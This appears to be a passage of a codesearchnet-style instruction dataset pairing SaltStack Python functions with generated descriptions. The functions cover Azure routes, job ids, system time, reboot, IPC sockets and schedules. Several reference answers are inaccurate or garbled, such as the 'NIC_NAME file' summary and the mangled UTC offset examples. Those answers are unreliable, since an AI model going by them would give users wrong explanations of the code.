'').lower():\n            ret['changes']['next_hop_type'] = {\n                'old': route.get('next_hop_type'),\n                'new': next_hop_type\n            }\n\n        if next_hop_type.lower() == 'virtualappliance' and next_hop_ip_address != route.get('next_hop_ip_address'):\n            ret['changes']['next_hop_ip_address'] = {\n                'old': route.get('next_hop_ip_address'),\n                'new': next_hop_ip_address\n            }\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Route {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Route {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'address_prefix': address_prefix,\n                'next_hop_type': next_hop_type,\n                'next_hop_ip_address': next_hop_ip_address\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Route {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    route_kwargs = kwargs.copy()\n    route_kwargs.update(connection_auth)\n\n    route = __salt__['azurearm_network.route_create_or_update'](\n        name=name,\n        route_table=route_table,\n        resource_group=resource_group,\n        address_prefix=address_prefix,\n        next_hop_type=next_hop_type,\n        next_hop_ip_address=next_hop_ip_address,\n        **route_kwargs\n    )\n\n    if 'error' not in route:\n        ret['result'] = True\n        ret['comment'] = 'Route {0} has been created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create route {0}! ({1})'.format(name, route.get('error'))\n    return ret", "response": "Ensure a route exists within a route table."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nensuring a route table is absent in the resource group.", "response": "def route_absent(name, route_table, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a route table does not exist in the resource group.\n\n    :param name:\n        Name of the route table.\n\n    :param route_table:\n        The name of the existing route table containing the route.\n\n    :param resource_group:\n        The resource group assigned to the route table.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    route = __salt__['azurearm_network.route_get'](\n        name,\n        route_table,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in route:\n        ret['result'] = True\n        ret['comment'] = 'Route {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Route {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': route,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.route_delete'](name, route_table, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Route {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': route,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete route {0}!'.format(name)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef is_jid(jid):\n    '''\n    Returns True if the passed in value is a job id\n    '''\n    if not isinstance(jid, six.string_types):\n        return False\n    if len(jid) != 20 and (len(jid) <= 21 or jid[20] != '_'):\n        return False\n    try:\n        int(jid[:20])\n        return True\n    except ValueError:\n        return False", "response": "Returns True if the passed in value is a job id\n    Returns False otherwise"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef jid_to_time(jid):\n    '''\n    Convert a salt job id into the time when the job was invoked\n    '''\n    jid = six.text_type(jid)\n    if len(jid) != 20 and (len(jid) <= 21 or jid[20] != '_'):\n        return ''\n    year = jid[:4]\n    month = jid[4:6]\n    day = jid[6:8]\n    hour = jid[8:10]\n    minute = jid[10:12]\n    second = jid[12:14]\n    micro = jid[14:20]\n\n    ret = '{0}, {1} {2} {3}:{4}:{5}.{6}'.format(year,\n                                                months[int(month)],\n                                                day,\n                                                hour,\n                                                minute,\n                                                second,\n                                                micro)\n    return ret", "response": "Convert a salt job id into a time when the job was invoked"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nformatting the job instance correctly", "response": "def format_job_instance(job):\n    '''\n    Format the job instance correctly\n    '''\n    ret = {'Function': job.get('fun', 'unknown-function'),\n           'Arguments': list(job.get('arg', [])),\n           # unlikely but safeguard from invalid returns\n           'Target': job.get('tgt', 'unknown-target'),\n           'Target-type': job.get('tgt_type', 'list'),\n           'User': job.get('user', 'root')}\n\n    if 'metadata' in job:\n        ret['Metadata'] = job.get('metadata', {})\n    else:\n        if 'kwargs' in job:\n            if 'metadata' in job['kwargs']:\n                ret['Metadata'] = job['kwargs'].get('metadata', {})\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nformats the jid correctly", "response": "def format_jid_instance(jid, job):\n    '''\n    Format the jid correctly\n    '''\n    ret = format_job_instance(job)\n    ret.update({'StartTime': jid_to_time(jid)})\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef format_jid_instance_ext(jid, job):\n    '''\n    Format the jid correctly with jid included\n    '''\n    ret = format_job_instance(job)\n    ret.update({\n        'JID': jid,\n        'StartTime': jid_to_time(jid)})\n    return ret", "response": "Format the jid correctly with jid included\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef jid_dir(jid, job_dir=None, hash_type='sha256'):\n    '''\n    Return the jid_dir for the given job id\n    '''\n    if not isinstance(jid, six.string_types):\n        jid = six.text_type(jid)\n    jhash = getattr(hashlib, hash_type)(\n        salt.utils.stringutils.to_bytes(jid)).hexdigest()\n\n    parts = []\n    if job_dir is not None:\n        parts.append(job_dir)\n    parts.extend([jhash[:2], jhash[2:]])\n    return os.path.join(*parts)", "response": "Return the jid_dir for the given job id"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nchanges the system runlevel on sysV compatible systems CLI Example: .. code-block:: bash salt '*' system.init 3", "response": "def init(runlevel):\n    '''\n    Change the system runlevel on sysV compatible systems\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' system.init 3\n    '''\n    cmd = ['init', '{0}'.format(runlevel)]\n    ret = __salt__['cmd.run'](cmd, python_shell=False)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef reboot(at_time=None):\n    '''\n    Reboot the system\n\n    at_time\n        The wait time in minutes before the system will be rebooted.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' system.reboot\n    '''\n    cmd = ['shutdown', '-r', ('{0}'.format(at_time) if at_time else 'now')]\n    ret = __salt__['cmd.run'](cmd, python_shell=False)\n    return ret", "response": "Reboot the system\n    at_time"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef shutdown(at_time=None):\n    '''\n    Shutdown a running system\n\n    at_time\n        The wait time in minutes before the system will be shutdown.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' system.shutdown 5\n    '''\n    cmd = ['shutdown', '-h', ('{0}'.format(at_time) if at_time else 'now')]\n    ret = __salt__['cmd.run'](cmd, python_shell=False)\n    return ret", "response": "Shut down a running system\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _date_bin_set_datetime(new_date):\n    '''\n    set the system date/time using the date command\n\n    Note using a strictly posix-compliant date binary we can only set the date\n    up to the minute.\n    '''\n    cmd = ['date']\n\n    # if there is a timezone in the datetime object use that offset\n    # This will modify the new_date to be the equivalent time in UTC\n    if new_date.utcoffset() is not None:\n        new_date = new_date - new_date.utcoffset()\n        new_date = new_date.replace(tzinfo=_FixedOffset(0))\n        cmd.append('-u')\n\n    # the date can be set in the following format:\n    # Note that setting the time with a resolution of seconds\n    # is not a posix feature, so we will attempt it and if it\n    # fails we will try again only using posix features\n\n    # date MMDDhhmm[[CC]YY[.ss]]\n    non_posix = (\"{1:02}{2:02}{3:02}{4:02}{0:04}.{5:02}\"\n                 .format(*new_date.timetuple()))\n    non_posix_cmd = cmd + [non_posix]\n\n    ret_non_posix = __salt__['cmd.run_all'](non_posix_cmd, python_shell=False)\n    if ret_non_posix['retcode'] != 0:\n        # We will now try the command again following posix\n        # date MMDDhhmm[[CC]YY]\n        posix = \" {1:02}{2:02}{3:02}{4:02}{0:04}\".format(*new_date.timetuple())\n        posix_cmd = cmd + [posix]\n\n        ret_posix = __salt__['cmd.run_all'](posix_cmd, python_shell=False)\n        if ret_posix['retcode'] != 0:\n            # if both fail it's likely an invalid date string\n            # so we will give back the error from the first attempt\n            msg = 'date failed: {0}'.format(ret_non_posix['stderr'])\n            raise CommandExecutionError(msg)\n    return True", "response": "Set the date of the system using the date command"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn True if the system has a hardware clock capable of being set from software.", "response": "def has_settable_hwclock():\n    '''\n    Returns True if the system has a hardware clock capable of being\n    set from software.\n\n    CLI Example:\n\n    salt '*' system.has_settable_hwclock\n    '''\n    if salt.utils.path.which_bin(['hwclock']) is not None:\n        res = __salt__['cmd.run_all'](\n            ['hwclock', '--test', '--systohc'], python_shell=False,\n            output_loglevel='quiet', ignore_retcode=True\n        )\n        return res['retcode'] == 0\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _swclock_to_hwclock():\n    '''\n    Set hardware clock to value of software clock.\n    '''\n    res = __salt__['cmd.run_all'](['hwclock', '--systohc'], python_shell=False)\n    if res['retcode'] != 0:\n        msg = 'hwclock failed to set hardware clock from software clock: {0}'.format(res['stderr'])\n        raise CommandExecutionError(msg)\n    return True", "response": "Set hardware clock to value of software clock."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _offset_to_min(utc_offset):\n    '''\n    Helper function that converts the utc offset string into number of minutes\n    offset. Input is in form \"[+-]?HHMM\". Example valid inputs are \"+0500\"\n    \"-0300\" and \"0800\". These would return -300, 180, 480 respectively.\n    '''\n    match = re.match(r\"^([+-])?(\\d\\d)(\\d\\d)$\", utc_offset)\n    if not match:\n        raise SaltInvocationError(\"Invalid UTC offset\")\n\n    sign = -1 if match.group(1) == '-' else 1\n    hours_offset = int(match.group(2))\n    minutes_offset = int(match.group(3))\n    total_offset = sign * (hours_offset * 60 + minutes_offset)\n    return total_offset", "response": "Helper function that converts the utc offset string into number of minutes\n    offset. Input is in form HHMM - 0500 - 350 - 480."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the current time adjusted using the input timezone offset.", "response": "def _get_offset_time(utc_offset):\n    '''\n    Will return the current time adjusted using the input timezone offset.\n\n    :rtype datetime:\n    '''\n    if utc_offset is not None:\n        minutes = _offset_to_min(utc_offset)\n        offset = timedelta(minutes=minutes)\n        offset_time = datetime.utcnow() + offset\n        offset_time = offset_time.replace(tzinfo=_FixedOffset(minutes))\n    else:\n        offset_time = datetime.now()\n    return offset_time"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nset the system time for the current node.", "response": "def set_system_time(newtime, utc_offset=None):\n    '''\n    Set the system time.\n\n    :param str newtime:\n        The time to set. Can be any of the following formats.\n        - HH:MM:SS AM/PM\n        - HH:MM AM/PM\n        - HH:MM:SS (24 hour)\n        - HH:MM (24 hour)\n\n        Note that the salt command line parser parses the date/time\n        before we obtain the argument (preventing us from doing utc)\n        Therefore the argument must be passed in as a string.\n        Meaning you may have to quote the text twice from the command line.\n\n    :param str utc_offset: The utc offset in 4 digit (+0600) format with an\n        optional sign (+/-).  Will default to None which will use the local\n        timezone. To set the time based off of UTC use \"'+0000'\". Note: if\n        being passed through the command line will need to be quoted twice to\n        allow negative offsets.\n    :return: Returns True if successful. Otherwise False.\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' system.set_system_time \"'11:20'\"\n    '''\n    fmts = ['%I:%M:%S %p', '%I:%M %p', '%H:%M:%S', '%H:%M']\n    dt_obj = _try_parse_datetime(newtime, fmts)\n    if dt_obj is None:\n        return False\n\n    return set_system_date_time(hours=dt_obj.hour, minutes=dt_obj.minute,\n                                seconds=dt_obj.second, utc_offset=utc_offset)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nset the system date and time for the given set of values.", "response": "def set_system_date_time(years=None,\n                         months=None,\n                         days=None,\n                         hours=None,\n                         minutes=None,\n                         seconds=None,\n                         utc_offset=None):\n    '''\n    Set the system date and time. Each argument is an element of the date, but\n    not required. If an element is not passed, the current system value for\n    that element will be used. For example, if you don't pass the year, the\n    current system year will be used. (Used by set_system_date and\n    set_system_time)\n\n    Updates hardware clock, if present, in addition to software\n    (kernel) clock.\n\n    :param int years: Years digit, ie: 2015\n    :param int months: Months digit: 1 - 12\n    :param int days: Days digit: 1 - 31\n    :param int hours: Hours digit: 0 - 23\n    :param int minutes: Minutes digit: 0 - 59\n    :param int seconds: Seconds digit: 0 - 59\n    :param str utc_offset: The utc offset in 4 digit (+0600) format with an\n        optional sign (+/-).  Will default to None which will use the local\n        timezone. To set the time based off of UTC use \"'+0000'\". Note: if\n        being passed through the command line will need to be quoted twice to\n        allow negative offsets.\n    :return: True if successful. Otherwise False.\n    :rtype: bool\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' system.set_system_date_time 2015 5 12 11 37 53 \"'-0500'\"\n    '''\n    # Get the current date/time\n    date_time = _get_offset_time(utc_offset)\n\n    # Check for passed values. If not passed, use current values\n    if years is None:\n        years = date_time.year\n    if months is None:\n        months = date_time.month\n    if days is None:\n        days = date_time.day\n    if hours is None:\n        hours = date_time.hour\n    if minutes is None:\n        minutes = date_time.minute\n    if seconds is None:\n        seconds = date_time.second\n\n    try:\n        new_datetime = datetime(years, months, days, hours, minutes, seconds, 0,\n                                date_time.tzinfo)\n    except ValueError as err:\n        raise SaltInvocationError(err.message)\n\n    if not _date_bin_set_datetime(new_datetime):\n        return False\n\n    if has_settable_hwclock():\n        # Now that we've successfully set the software clock, we should\n        # update hardware clock for time to persist though reboot.\n        return _swclock_to_hwclock()\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_computer_desc():\n    '''\n    Get PRETTY_HOSTNAME value stored in /etc/machine-info\n    If this file doesn't exist or the variable doesn't exist\n    return False.\n\n    :return: Value of PRETTY_HOSTNAME if this does not exist False.\n    :rtype: str\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' system.get_computer_desc\n    '''\n    hostname_cmd = salt.utils.path.which('hostnamectl')\n    if hostname_cmd:\n        desc = __salt__['cmd.run'](\n            [hostname_cmd, 'status', '--pretty'],\n            python_shell=False\n        )\n    else:\n        desc = None\n        pattern = re.compile(r'^\\s*PRETTY_HOSTNAME=(.*)$')\n        try:\n            with salt.utils.files.fopen('/etc/machine-info', 'r') as mach_info:\n                for line in mach_info.readlines():\n                    line = salt.utils.stringutils.to_unicode(line)\n                    match = pattern.match(line)\n                    if match:\n                        # get rid of whitespace then strip off quotes\n                        desc = _strip_quotes(match.group(1).strip())\n                        # no break so we get the last occurance\n        except IOError:\n            pass\n\n        if desc is None:\n            return False\n\n    return desc.replace(r'\\\"', r'\"').replace(r'\\n', '\\n').replace(r'\\t', '\\t')", "response": "Return the value stored in the NIC_NAME file"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsetting the computer description in the neccesary way.", "response": "def set_computer_desc(desc):\n    '''\n    Set PRETTY_HOSTNAME value stored in /etc/machine-info\n    This will create the file if it does not exist. If\n    it is unable to create or modify this file returns False.\n\n    :param str desc: The computer description\n    :return: False on failure. True if successful.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' system.set_computer_desc \"Michael's laptop\"\n    '''\n    desc = salt.utils.stringutils.to_unicode(\n        desc).replace('\"', r'\\\"').replace('\\n', r'\\n').replace('\\t', r'\\t')\n\n    hostname_cmd = salt.utils.path.which('hostnamectl')\n    if hostname_cmd:\n        result = __salt__['cmd.retcode'](\n            [hostname_cmd, 'set-hostname', '--pretty', desc],\n            python_shell=False\n        )\n        return True if result == 0 else False\n\n    if not os.path.isfile('/etc/machine-info'):\n        with salt.utils.files.fopen('/etc/machine-info', 'w'):\n            pass\n\n    pattern = re.compile(r'^\\s*PRETTY_HOSTNAME=(.*)$')\n    new_line = salt.utils.stringutils.to_str('PRETTY_HOSTNAME=\"{0}\"'.format(desc))\n    try:\n        with salt.utils.files.fopen('/etc/machine-info', 'r+') as mach_info:\n            lines = mach_info.readlines()\n            for i, line in enumerate(lines):\n                if pattern.match(salt.utils.stringutils.to_unicode(line)):\n                    lines[i] = new_line\n                    break\n            else:\n                # PRETTY_HOSTNAME line was not found, add it to the end\n                lines.append(new_line)\n            # time to write our changes to the file\n            mach_info.seek(0, 0)\n            mach_info.truncate()\n            mach_info.writelines(lines)\n            return True\n    except IOError:\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef handle_stream(self, stream):\n        '''\n        Override this to handle the streams as they arrive\n\n        :param IOStream stream: An IOStream for processing\n\n        See https://tornado.readthedocs.io/en/latest/iostream.html#tornado.iostream.IOStream\n        for additional details.\n        '''\n        @tornado.gen.coroutine\n        def _null(msg):\n            raise tornado.gen.Return(None)\n\n        def write_callback(stream, header):\n            if header.get('mid'):\n                @tornado.gen.coroutine\n                def return_message(msg):\n                    pack = salt.transport.frame.frame_msg_ipc(\n                        msg,\n                        header={'mid': header['mid']},\n                        raw_body=True,\n                    )\n                    yield stream.write(pack)\n                return return_message\n            else:\n                return _null\n        if six.PY2:\n            encoding = None\n        else:\n            encoding = 'utf-8'\n        unpacker = msgpack.Unpacker(encoding=encoding)\n        while not stream.closed():\n            try:\n                wire_bytes = yield stream.read_bytes(4096, partial=True)\n                unpacker.feed(wire_bytes)\n                for framed_msg in unpacker:\n                    body = framed_msg['body']\n                    self.io_loop.spawn_callback(self.payload_handler, body, write_callback(stream, framed_msg['head']))\n            except tornado.iostream.StreamClosedError:\n                log.trace('Client disconnected from IPC %s', self.socket_path)\n                break\n            except socket.error as exc:\n                # On occasion an exception will occur with\n                # an error code of 0, it's a spurious exception.\n                if exc.errno == 0:\n                    log.trace('Exception occured with error number 0, '\n                              'spurious exception: %s', exc)\n                else:\n                    log.error('Exception occurred while '\n                              'handling stream: %s', exc)\n            except Exception as exc:\n                log.error('Exception occurred while '\n                          'handling stream: %s', exc)", "response": "Handle the given stream and yield the messages that are available to the user."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nclose the underlying socket and filehandles.", "response": "def close(self):\n        '''\n        Routines to handle any cleanup before the instance shuts down.\n        Sockets and filehandles should be closed explicitly, to prevent\n        leaks.\n        '''\n        if self._closing:\n            return\n        self._closing = True\n        if hasattr(self.sock, 'close'):\n            self.sock.close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef connect(self, callback=None, timeout=None):\n        '''\n        Connect to the IPC socket\n        '''\n        if hasattr(self, '_connecting_future') and not self._connecting_future.done():  # pylint: disable=E0203\n            future = self._connecting_future  # pylint: disable=E0203\n        else:\n            if hasattr(self, '_connecting_future'):\n                # read previous future result to prevent the \"unhandled future exception\" error\n                self._connecting_future.exception()  # pylint: disable=E0203\n            future = tornado.concurrent.Future()\n            self._connecting_future = future\n            self._connect(timeout=timeout)\n\n        if callback is not None:\n            def handle_future(future):\n                response = future.result()\n                self.io_loop.add_callback(callback, response)\n            future.add_done_callback(handle_future)\n\n        return future", "response": "Connect to the IPC socket and return a future that will be returned when the socket is ready."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _connect(self, timeout=None):\n        '''\n        Connect to a running IPCServer\n        '''\n        if isinstance(self.socket_path, int):\n            sock_type = socket.AF_INET\n            sock_addr = ('127.0.0.1', self.socket_path)\n        else:\n            sock_type = socket.AF_UNIX\n            sock_addr = self.socket_path\n\n        self.stream = None\n        if timeout is not None:\n            timeout_at = time.time() + timeout\n\n        while True:\n            if self._closing:\n                break\n\n            if self.stream is None:\n                with salt.utils.asynchronous.current_ioloop(self.io_loop):\n                    self.stream = IOStream(\n                        socket.socket(sock_type, socket.SOCK_STREAM),\n                    )\n\n            try:\n                log.trace('IPCClient: Connecting to socket: %s', self.socket_path)\n                yield self.stream.connect(sock_addr)\n                self._connecting_future.set_result(True)\n                break\n            except Exception as e:\n                if self.stream.closed():\n                    self.stream = None\n\n                if timeout is None or time.time() > timeout_at:\n                    if self.stream is not None:\n                        self.stream.close()\n                        self.stream = None\n                    self._connecting_future.set_exception(e)\n                    break\n\n                yield tornado.gen.sleep(1)", "response": "Connect to a running IPCServer and return a tornado. Future that fires when the connection is complete."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef close(self):\n        '''\n        Routines to handle any cleanup before the instance shuts down.\n        Sockets and filehandles should be closed explicitly, to prevent\n        leaks.\n        '''\n        if self._closing:\n            return\n\n        if self._refcount > 1:\n            # Decrease refcount\n            with self._refcount_lock:\n                self._refcount -= 1\n            log.debug(\n                'This is not the last %s instance. Not closing yet.',\n                self.__class__.__name__\n            )\n            return\n\n        self._closing = True\n\n        log.debug('Closing %s instance', self.__class__.__name__)\n\n        if self.stream is not None and not self.stream.closed():\n            self.stream.close()\n\n        # Remove the entry from the instance map so\n        # that a closed entry may not be reused.\n        # This forces this operation even if the reference\n        # count of the entry has not yet gone to zero.\n        if self.io_loop in self.__class__.instance_map:\n            loop_instance_map = self.__class__.instance_map[self.io_loop]\n            if self._instance_key in loop_instance_map:\n                del loop_instance_map[self._instance_key]\n            if not loop_instance_map:\n                del self.__class__.instance_map[self.io_loop]", "response": "Closes the current instance."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsends a message to an IPC socket.", "response": "def send(self, msg, timeout=None, tries=None):\n        '''\n        Send a message to an IPC socket\n\n        If the socket is not currently connected, a connection will be established.\n\n        :param dict msg: The message to be sent\n        :param int timeout: Timeout when sending message (Currently unimplemented)\n        '''\n        if not self.connected():\n            yield self.connect()\n        pack = salt.transport.frame.frame_msg_ipc(msg, raw_body=True)\n        yield self.stream.write(pack)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nstarts up the Tornado IPC server.", "response": "def start(self):\n        '''\n        Perform the work necessary to start up a Tornado IPC server\n\n        Blocks until socket is established\n        '''\n        # Start up the ioloop\n        log.trace('IPCMessagePublisher: binding to socket: %s', self.socket_path)\n        if isinstance(self.socket_path, int):\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            if self.opts.get('ipc_so_sndbuf'):\n                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.opts['ipc_so_sndbuf'])\n            if self.opts.get('ipc_so_rcvbuf'):\n                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.opts['ipc_so_rcvbuf'])\n            self.sock.setblocking(0)\n            self.sock.bind(('127.0.0.1', self.socket_path))\n            # Based on default used in tornado.netutil.bind_sockets()\n            self.sock.listen(self.opts['ipc_so_backlog'])\n        else:\n            # sndbuf/rcvbuf does not apply to unix sockets\n            self.sock = tornado.netutil.bind_unix_socket(self.socket_path, backlog=self.opts['ipc_so_backlog'])\n\n        with salt.utils.asynchronous.current_ioloop(self.io_loop):\n            tornado.netutil.add_accept_handler(\n                self.sock,\n                self.handle_connection,\n            )\n        self._started = True"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef publish(self, msg):\n        '''\n        Send message to all connected sockets\n        '''\n        if not self.streams:\n            return\n\n        pack = salt.transport.frame.frame_msg_ipc(msg, raw_body=True)\n\n        for stream in self.streams:\n            self.io_loop.spawn_callback(self._write, stream, pack)", "response": "Send message to all connected sockets"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nclose the underlying socket and filehandles.", "response": "def close(self):\n        '''\n        Routines to handle any cleanup before the instance shuts down.\n        Sockets and filehandles should be closed explicitly, to prevent\n        leaks.\n        '''\n        if self._closing:\n            return\n        self._closing = True\n        for stream in self.streams:\n            stream.close()\n        self.streams.clear()\n        if hasattr(self.sock, 'close'):\n            self.sock.close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreads a message from an IPC socket and return it.", "response": "def read_sync(self, timeout=None):\n        '''\n        Read a message from an IPC socket\n\n        The socket must already be connected.\n        The associated IO Loop must NOT be running.\n        :param int timeout: Timeout when receiving message\n        :return: message data if successful. None if timed out. Will raise an\n                 exception for all other error conditions.\n        '''\n        if self.saved_data:\n            return self.saved_data.pop(0)\n\n        self._sync_ioloop_running = True\n        self._read_sync_future = self._read_sync(timeout)\n        self.io_loop.start()\n        self._sync_ioloop_running = False\n\n        ret_future = self._read_sync_future\n        self._read_sync_future = None\n        return ret_future.result()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef list_(show_all=False,\n          show_disabled=True,\n          where=None,\n          return_yaml=True):\n    '''\n    List the jobs currently scheduled on the minion\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.list\n\n        # Show all jobs including hidden internal jobs\n        salt '*' schedule.list show_all=True\n\n        # Hide disabled jobs from list of jobs\n        salt '*' schedule.list show_disabled=False\n\n    '''\n\n    schedule = {}\n    try:\n        eventer = salt.utils.event.get_event('minion', opts=__opts__)\n        res = __salt__['event.fire']({'func': 'list',\n                                      'where': where}, 'manage_schedule')\n        if res:\n            event_ret = eventer.get_event(tag='/salt/minion/minion_schedule_list_complete', wait=30)\n            if event_ret and event_ret['complete']:\n                schedule = event_ret['schedule']\n    except KeyError:\n        # Effectively a no-op, since we can't really return without an event system\n        ret = {}\n        ret['comment'] = 'Event module not available. Schedule list failed.'\n        ret['result'] = True\n        log.debug('Event module not available. Schedule list failed.')\n        return ret\n\n    _hidden = ['enabled',\n               'skip_function',\n               'skip_during_range']\n    for job in list(schedule.keys()):  # iterate over a copy since we will mutate it\n        if job in _hidden:\n            continue\n\n        # Default jobs added by salt begin with __\n        # by default hide them unless show_all is True.\n        if job.startswith('__') and not show_all:\n            del schedule[job]\n            continue\n\n        # if enabled is not included in the job,\n        # assume job is enabled.\n        if 'enabled' not in schedule[job]:\n            schedule[job]['enabled'] = True\n\n        for item in pycopy.copy(schedule[job]):\n            if item not in SCHEDULE_CONF:\n                del schedule[job][item]\n                continue\n            if schedule[job][item] is None:\n                del schedule[job][item]\n                continue\n            if schedule[job][item] == 'true':\n                schedule[job][item] = True\n            if schedule[job][item] == 'false':\n                schedule[job][item] = False\n\n        # if the job is disabled and show_disabled is False, skip job\n        if not show_disabled and not schedule[job]['enabled']:\n            del schedule[job]\n            continue\n\n        if '_seconds' in schedule[job]:\n            # remove _seconds from the listing\n            del schedule[job]['_seconds']\n\n    if schedule:\n        if return_yaml:\n            tmp = {'schedule': schedule}\n            return salt.utils.yaml.safe_dump(tmp, default_flow_style=False)\n        else:\n            return schedule\n    else:\n        return {'schedule': {}}", "response": "List the currently scheduled jobs on the minion"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_enabled(name):\n    '''\n    List a Job only if its enabled\n\n    .. versionadded:: 2015.5.3\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.is_enabled name=job_name\n    '''\n\n    current_schedule = __salt__['schedule.list'](show_all=False, return_yaml=False)\n    if name in current_schedule:\n        return current_schedule[name]\n    else:\n        return {}", "response": "Return a Job only if its enabled"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef purge(**kwargs):\n    '''\n    Purge all the jobs currently scheduled on the minion\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' schedule.purge\n    '''\n\n    ret = {'comment': [],\n           'result': True}\n\n    for name in list_(show_all=True, return_yaml=False):\n        if name == 'enabled':\n            continue\n        if name.startswith('__'):\n            continue\n\n        if 'test' in kwargs and kwargs['test']:\n            ret['result'] = True\n            ret['comment'].append('Job: {0} would be deleted from schedule.'.format(name))\n        else:\n\n            persist = True\n            if 'persist' in kwargs:\n                persist = kwargs['persist']\n\n            try:\n                eventer = salt.utils.event.get_event('minion', opts=__opts__)\n                res = __salt__['event.fire']({'name': name,\n                                              'func': 'delete',\n                                              'persist': persist}, 'manage_schedule')\n                if res:\n                    event_ret = eventer.get_event(tag='/salt/minion/minion_schedule_delete_complete', wait=30)\n                    if event_ret and event_ret['complete']:\n                        _schedule_ret = event_ret['schedule']\n                        if name not in _schedule_ret:\n                            ret['result'] = True\n                            ret['comment'].append('Deleted job: {0} from schedule.'.format(name))\n                        else:\n                            ret['comment'].append('Failed to delete job {0} from schedule.'.format(name))\n                            ret['result'] = True\n\n            except KeyError:\n                # Effectively a no-op, since we can't really return without an event system\n                ret['comment'] = 'Event module not available. Schedule add failed.'\n                ret['result'] = True\n    return ret", "response": "Purge all the jobs currently scheduled on the minion"}
